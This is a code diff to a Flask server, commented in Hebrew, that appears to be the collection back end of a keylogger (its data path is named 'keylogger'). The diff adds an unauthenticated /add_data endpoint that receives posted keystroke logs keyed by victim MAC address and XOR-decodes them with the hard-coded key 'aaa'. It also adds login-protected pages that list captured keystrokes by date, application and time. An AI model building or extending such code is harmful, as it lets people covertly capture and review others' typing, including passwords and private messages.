@@ -4,6 +4,7 @@ import os
 import json
 import time
 from flask_cors import CORS
+import dc_Encryptor
 import flask_login
 app = Flask(__name__)
 CORS(app)
@@ -73,30 +74,39 @@ def show_folder_contents(folder_name):
     base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
     files = load_data(mac_address=str(folder_name))
 
-    # לא מחזיר JSON גולמי, אלא מעבד את הנתונים בצורה מתאימה
-    file_info = []  # יצירת רשימה שתכיל את המידע עבור התצוגה
-    print(files)
-    print("aaaaaaaaaaaaaaaa")
+    # יצירת רשימה של התאריכים והקבצים הזמינים
+    available_dates = []
     for mac, data in files.items():
-        for date, files_in_date in data.items():
-
-            for filename, key_events in files_in_date.items():
-                for time_write , current_app_event in key_events.items():
-                    for current_app , events in current_app_event.items():
-
-
-                        file_info.append({
-                            'mac': mac,
-                            'date': date,
-                            'filename': filename,
-                            'app': current_app,
-                            'time write' : time_write,
-                            'events': events
-                        })
-                        # print(key_events)
+        for date in data.keys():
+            available_dates.append(date)
 
     # מחזיר את המידע לתבנית ה-HTML
-    return render_template('folder_contents.html', folder_name=folder_name, files=file_info)
+    return render_template('folder_contents.html', folder_name=folder_name, available_dates=available_dates)
+
+
+@app.route('/folders/<folder_name>/<date>', methods=['GET'])
+@login_required
+def show_file_data(folder_name, date):
+    # טוען את הנתונים עבור תאריך מסוים
+    files = load_data(mac_address=str(folder_name), date=date)
+
+    # הצגת המידע של הקובץ
+    file_info = []
+    for mac, data in files.items():
+        if date in data:
+            print(f"Found data for {date}.json")  # הדפסת מידע שהנתונים מצורפים לתאריך
+            for filename, key_events in data[date].items():
+                for time_write, current_app_event in key_events.items():
+                    for current_app, events in current_app_event.items():
+                        file_info.append({
+                            'mac': mac,
+                            'filename': filename,
+                            'date': time_write,  # כאן ניתן להחזיר את התאריך בצורה מדויקת
+                            'app': current_app,
+                            'data': events
+                        })
+
+    return render_template('file_data.html', folder_name=folder_name, date=date, file_info=file_info)
 
 # עמוד התנתקות
 @app.route('/logout')
@@ -201,11 +211,11 @@ def merge_values(val_a, val_b):
 
     elif not isinstance(val_a, list) and isinstance(val_b, list):
         return [val_a] + val_b
-
     else:
         return [val_a, val_b]
 
 def save_new_data(data):
+    print(type(data))
     first_key = (next(iter(data)))
     mac_address = first_key.replace(":" , "-")
     # גישה למפתח השני במילון הפנימי
@@ -220,14 +230,28 @@ def save_new_data(data):
         json.dump(data , file , indent=4 , ensure_ascii=False)
 
 
-
 @app.route('/add_data', methods=['POST'])
 def upload_data():
-    new_data = flask.request.json
-    if not new_data:
-        return flask.jsonify({'error':"do not get data"}),400
-    save_new_data(new_data)
-    return flask.jsonify({'message':'save successfully'}),200
+    # try:
+        # קבלת נתונים כ-JSON
+        new_data = flask.request.json
+        print(new_data)
+        # אם אין נתונים, מחזירים שגיאה
+        if not new_data:
+            return flask.jsonify({'error': "No data received"}), 400
+
+        # הצפנה אם צריך
+        decrypted_data = dc_Encryptor.Encryptor.xor_decryption(new_data, "aaa")
+
+        # שמירת הנתונים
+        save_new_data(decrypted_data)
+
+        # מחזירים הודעת הצלחה
+        return flask.jsonify({'message': 'Save successfully'}), 200
+
+    # except Exception as e:
+    #     # במקרה של שגיאה כלשהי, מחזירים הודעת שגיאה
+    #     return flask.jsonify({'error': str(e)}), 400
 
 
 @app.route('/<computers>',methods=['GET'])
@@ -249,4 +273,4 @@ def health():
 
 if __name__ == '__main__':
     app.run(debug=True)
-print(load_data("d0-39-57-0d-5c-a5"))
+# print(load_data("d0-39-57-0d-5c-a5" , date='24-02-2025_10-10'))
